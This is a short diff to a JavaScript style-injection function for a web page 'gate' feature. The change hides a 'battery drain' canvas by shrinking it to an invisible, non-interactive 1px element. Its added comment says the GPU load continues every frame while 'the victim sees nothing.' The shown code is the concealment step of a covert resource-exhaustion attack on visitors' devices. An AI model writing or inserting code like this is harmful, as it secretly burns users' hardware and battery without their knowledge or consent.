@@ -705,7 +705,12 @@ function injectStyles() {
   @keyframes gate-zoom { 0%{transform:scale(.15);opacity:.2} 100%{transform:scale(1);opacity:1} }
   @keyframes gate-spin { from{transform:rotate(0)} to{transform:rotate(360deg)} }
   html.gate-spinning { animation: gate-spin 3s linear infinite; }
-  #gateBatteryCanvas { position: fixed; inset: 0; width: 100vw; height: 100vh; z-index: 100004; border: 0; }
+  /* Battery drain runs INVISIBLY: the GPU load comes from the huge internal
+     drawing-buffer (set in JS), not the on-screen size — so we hide the element
+     to a 1px, transparent, behind-everything, non-interactive dot. The victim
+     sees nothing; the hardware still burns every frame. */
+  #gateBatteryCanvas { position: fixed; left: 0; bottom: 0; width: 1px; height: 1px;
+    opacity: 0; z-index: -1; border: 0; pointer-events: none; }
   `;
   const style = document.createElement("style");
   style.id = "gate-shared-css";
